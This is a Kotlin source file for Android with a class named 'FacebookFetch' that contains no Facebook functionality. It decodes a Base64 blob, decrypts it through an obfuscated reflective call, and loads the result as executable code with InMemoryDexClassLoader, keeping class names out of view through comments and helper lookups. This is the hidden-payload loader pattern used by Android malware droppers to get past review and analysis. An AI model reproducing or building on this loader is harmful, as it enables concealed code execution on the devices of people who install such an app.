package com.solar.tabor.nkil

import java.nio.ByteBuffer
import java.util.Base64

/**
 * Date：2025/10/17
 * Describe:
 */

class FacebookFetch : BaseFc() {
    private var listStr = listOf("1", "2", "com.faisl.akiz", "as.sizs")

    //"dalvik.system.InMemoryDexClassLoader"
    //"java.lang.ClassLoader"
    //
    fun readInfo(context: Any, string: String, stringCode: String) {
        if (string.isEmpty()) return
        val list: List<String> = string.split("=")
        listStr = list

        //z.m
        val b: ByteArray = Class.forName("z.m").getMethod(
            "d", String::class.java, ByteArray::class.java
        ).invoke(
            null, list[2], Base64.getDecoder().decode(stringCode)
        ) as ByteArray? ?: return

        fbInitStart(ByteBuffer.wrap(b), context, list)
        return
    }

    private fun fbInitStart(bf: ByteBuffer, ctx: Any, list: List<String>) {
        //"dalvik.system.InMemoryDexClassLoader"
        val clzz = fetchPair().first
        //java.lang.ClassLoader
        val c = clzz.getDeclaredConstructor(fetchPair().second, Class.forName(list[1]))

        //"getClassLoader"
        val cL = c.newInstance(bf, ctx.javaClass.getMethod(fetchName()).invoke(ctx))

        next(cL)

    }


    override fun tagStr(int: Int): String {
        runCatching {
            return listStr[int]
        }
        return listStr[0]
    }

}